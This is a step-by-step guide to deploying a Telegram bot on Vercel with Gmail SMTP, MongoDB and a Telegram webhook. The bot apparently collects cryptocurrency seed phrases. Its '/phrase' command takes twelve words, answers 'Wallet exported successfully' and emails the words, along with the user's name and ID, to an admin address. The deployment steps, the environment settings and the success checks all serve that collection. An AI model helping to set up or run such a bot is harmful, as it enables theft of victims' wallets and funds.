# Deploy to Vercel (Manual - Web Interface)

## ✅ Pre-Deployment Checklist

Your code is now **clean and ready** for Vercel deployment:
- ✅ All SendGrid remnants removed
- ✅ Using Gmail SMTP (which works on Vercel)
- ✅ All imports pointing to correct files
- ✅ `vercel.json` configuration ready
- ✅ No linter errors

## 📤 Step-by-Step Deployment

### Step 1: Push Your Code to Git

If not already done:

```bash
git add .
git commit -m "Prepare for Vercel deployment with SMTP"
git push origin main
```

**Note:** If you don't have a Git repo yet:
1. Go to GitHub.com
2. Create a new repository
3. Follow GitHub's instructions to push your code

### Step 2: Sign Up/Login to Vercel

1. Go to: https://vercel.com/signup
2. Sign up with GitHub (easiest option)
3. Authorize Vercel to access your repositories

### Step 3: Import Your Project

1. Once logged in, click **"Add New..."** → **"Project"**
2. You'll see a list of your GitHub repositories
3. Find **"TelegramBot"** (or whatever you named it)
4. Click **"Import"**

### Step 4: Configure Project Settings

On the configuration screen:

**Project Name:**
- Enter: `telegram-bot` (or your preferred name)
- This becomes your URL: `telegram-bot-xxx.vercel.app`

**Framework Preset:**
- Should auto-detect as "Other" (that's correct!)
- Don't change this

**Root Directory:**
- Leave as `./` (default)

**Build & Development Settings:**
- Leave default (Vercel auto-configures for Node.js)

### Step 5: Add Environment Variables ⚠️ CRITICAL

Click **"Environment Variables"** to expand, then add these one by one:

| Variable Name | Value | Environment |
|--------------|-------|-------------|
| `NODE_ENV` | `production` | Production |
| `BOT_TOKEN` | Your Telegram bot token | All (Production, Preview, Development) |
| `MONGO_URI` | Your MongoDB connection string | All |
| `ADMIN_EMAIL` | your-email@gmail.com | All |
| `ADMIN_EMAIL_PASS` | Your Gmail App Password | All |
| `HR_EMAIL` | backup-email@gmail.com | All |
| `ADMIN_PASSWORD` | Your admin password | All |
| `WEBHOOK_SECRET_PATH` | your_secret_path | All |

**For `WEBHOOK_URL`:** 
- **SKIP THIS FOR NOW** - We'll add it after first deployment

**Important:** 
- For each variable, check **all three**: Production, Preview, and Development
- Make sure `ADMIN_EMAIL_PASS` is your **Gmail App Password** (16 chars)
- No extra spaces before/after values

### Step 6: Deploy!

1. Click **"Deploy"** button (blue button at bottom)
2. Wait 1-3 minutes for deployment
3. You'll see a success screen with confetti 🎉
4. You'll get a URL like: `https://telegram-bot-abc123.vercel.app`

### Step 7: Add WEBHOOK_URL

**Important:** Now that you have the Vercel URL, add it as an environment variable:

1. In Vercel dashboard, go to your project
2. Click **Settings** → **Environment Variables**
3. Click **"Add New"**
4. Add:
   - **Key:** `WEBHOOK_URL`
   - **Value:** `https://your-actual-vercel-url.vercel.app` (copy from deployment)
   - **Environment:** Production, Preview, Development (all three)
5. Click **"Save"**

### Step 8: Redeploy to Apply WEBHOOK_URL

1. Go to **Deployments** tab
2. Click **"..."** menu on the latest deployment
3. Click **"Redeploy"**
4. Wait ~30 seconds for redeployment

### Step 9: Set Telegram Webhook

Your bot needs to know where to send updates. Two options:

#### Option A: Automatic (Usually Works)
Your code automatically sets the webhook on startup. Wait 1-2 minutes, then test.

#### Option B: Manual (If Option A doesn't work)
Use this curl command (replace values):

```bash
curl -X POST "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/setWebhook" \
  -d "url=https://your-vercel-url.vercel.app/your_secret_path"
```

Example:
```bash
curl -X POST "https://api.telegram.org/bot123456:ABC-DEF1234ghIkl-zyx57W2v1u123ew11/setWebhook" \
  -d "url=https://telegram-bot-abc123.vercel.app/my_secret_webhook_path"
```

**Verify webhook:**
```bash
curl "https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getWebhookInfo"
```

Should show your Vercel URL in the response.

### Step 10: Test Your Bot! 🧪

1. **Open Telegram** and go to your bot
2. **Send:** `/start`
3. **Expected:** Bot replies with welcome message
4. **Send a test phrase:**
   ```
   /phrase word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12
   ```
5. **Expected:** 
   - Bot replies: "✅ Wallet exported successfully"
   - You receive email at `ADMIN_EMAIL`
   - Check your inbox (and spam folder)

### Step 11: Check Logs (If Issues)

If something doesn't work:

1. Go to Vercel dashboard → Your project
2. Click **"Deployments"**
3. Click your latest deployment
4. Click **"View Function Logs"**

**Look for:**
```
✅ SMTP server connection verified successfully
✅ MongoDB connected successfully
✅ Webhook set to https://...
⚡️ Telegram bot live on production webhook
```

When you send `/phrase`:
```
📨 Phrase email sent to admin:
👤 User: Your Name (123456)
✅ Accepted: [your-email@gmail.com]
🔁 SMTP Response: 250 2.0.0 OK
```

## 🔄 Making Updates

To deploy changes later:

1. Make code changes locally
2. Commit and push to Git:
   ```bash
   git add .
   git commit -m "Your update message"
   git push origin main
   ```
3. Vercel automatically deploys! (if connected to Git)
4. Wait ~30 seconds
5. Changes are live!

## 📋 Environment Variables Summary

Here's the complete list you need in Vercel:

```
NODE_ENV=production
BOT_TOKEN=your_telegram_bot_token
MONGO_URI=mongodb+srv://your_connection_string
ADMIN_EMAIL=your-email@gmail.com
ADMIN_EMAIL_PASS=your_16_char_gmail_app_password
HR_EMAIL=backup-email@gmail.com
ADMIN_PASSWORD=your_admin_password
WEBHOOK_URL=https://your-vercel-url.vercel.app
WEBHOOK_SECRET_PATH=your_secret_path
```

## 🆘 Troubleshooting

### Bot Not Responding
**Issue:** Bot doesn't reply to messages

**Fix:**
1. Check webhook is set: `curl https://api.telegram.org/bot<TOKEN>/getWebhookInfo`
2. Verify URL matches your Vercel deployment
3. Check Vercel function logs for errors

### Email Not Sending
**Issue:** Bot replies but no email arrives

**Fix:**
1. Check spam/junk folder
2. Verify `ADMIN_EMAIL_PASS` is Gmail App Password (not regular password)
3. Check Vercel logs for SMTP errors
4. Test locally with: `node test-email.js` (if you kept the test file)

### Environment Variables Not Working
**Issue:** Bot errors about missing variables

**Fix:**
1. Go to Vercel → Settings → Environment Variables
2. Make sure ALL variables are set
3. Make sure you selected Production, Preview, AND Development for each
4. Redeploy after adding variables

### 500 Internal Server Error
**Issue:** Vercel shows 500 error

**Fix:**
1. Check function logs in Vercel dashboard
2. Usually a missing environment variable
3. Or MongoDB connection issue

## 🎯 Success Indicators

Your deployment is successful when:
- ✅ Vercel shows "Deployment Ready"
- ✅ Bot responds to `/start`
- ✅ Bot processes `/phrase` commands
- ✅ Emails arrive in your inbox
- ✅ No errors in Vercel function logs

## 📊 Vercel Free Tier Limits

Your bot should work fine within these limits:
- ✅ **100 GB bandwidth/month**
- ✅ **100 GB-hours serverless execution/month**
- ✅ **10 second function timeout**
- ✅ **SMTP connections allowed** ✅

## 🎉 You're Done!

Your Telegram bot is now:
- ✅ Deployed on Vercel
- ✅ Using Gmail SMTP (works on Vercel!)
- ✅ Free forever (within limits)
- ✅ Auto-deploys on git push
- ✅ Fast and reliable

**Need help?** Check Vercel docs: https://vercel.com/docs

---

**Quick Summary:**
1. Push code to GitHub
2. Import to Vercel
3. Add environment variables
4. Deploy
5. Add WEBHOOK_URL
6. Redeploy
7. Set Telegram webhook
8. Test!

**Total time: ~15 minutes**  
**Cost: $0**  
**Result: Working bot with Gmail SMTP!** 🚀

